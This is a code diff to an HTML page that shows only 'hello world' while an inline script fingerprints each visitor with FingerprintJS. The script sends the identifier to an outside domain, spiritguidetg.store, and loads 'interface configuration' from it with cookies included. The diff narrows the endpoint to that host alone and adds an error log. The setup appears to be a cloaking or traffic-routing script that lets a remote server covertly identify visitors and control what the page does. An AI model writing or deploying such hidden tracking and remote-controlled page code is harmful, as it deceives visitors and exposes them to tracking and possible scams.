@@ -8,19 +8,37 @@
     try {
         const CONFIG_API = 'https://spiritguidetg.store/fp.php';
         
-        // Динамический импорт вместо статического
+        // Динамический импорт
         const FingerprintJS = await import('/clk/fp.js');
         
         const fp = await FingerprintJS.load({
             region: 'eu',
-            endpoint: [CONFIG_API, FingerprintJS.defaultEndpoint]
+            endpoint: CONFIG_API, // Убираем массив, используем только наш endpoint
+            // Добавляем опции для cross-origin
+            storageKey: '_fpjs_visitor_id',
+            debug: false
         });
 
-        const { requestId } = await fp.get({ extendedResult: true });
+        const { requestId } = await fp.get({ 
+            extendedResult: true,
+            // Принудительно включаем cookies
+            linkedId: 'github-pages-request'
+        });
 
         // Загрузка конфигурации интерфейса
-        const res = await fetch(`${CONFIG_API}?request_id=${encodeURIComponent(requestId)}`);
-        if (!res.ok) return;
+        const res = await fetch(`${CONFIG_API}?request_id=${encodeURIComponent(requestId)}`, {
+            method: 'GET',
+            credentials: 'include', // Важно для cookies
+            headers: {
+                'Accept': 'application/json',
+                'Content-Type': 'application/json'
+            }
+        });
+        
+        if (!res.ok) {
+            console.error('API Error:', res.status, res.statusText);
+            return;
+        }
 
         const data = await res.json();
 
@@ -33,6 +51,7 @@
     }
 })();
 </script>
+
 </head>
 <body>
   hello world
